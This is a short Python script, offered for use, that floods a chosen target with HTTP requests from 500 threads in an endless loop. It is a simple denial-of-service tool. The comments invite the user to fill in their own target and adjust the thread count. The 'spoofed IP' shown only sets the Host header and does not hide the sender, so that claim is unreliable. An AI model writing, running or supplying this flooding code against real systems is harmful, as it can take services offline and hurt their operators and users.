import socket
import threading

target = 'TARGET_IP'  # Replace with your target IP
port = 80  # HTTP port, change to the target service's port
fake_ip = '182.21.20.32'  # Spoofed IP for masking

def attack():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
            s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
            s.close()
        except Exception as e:
            print(f"Error: {e}")
            s.close()

for i in range(500):  # Increase or decrease the number of threads
    thread = threading.Thread(target=attack)
    thread.start()
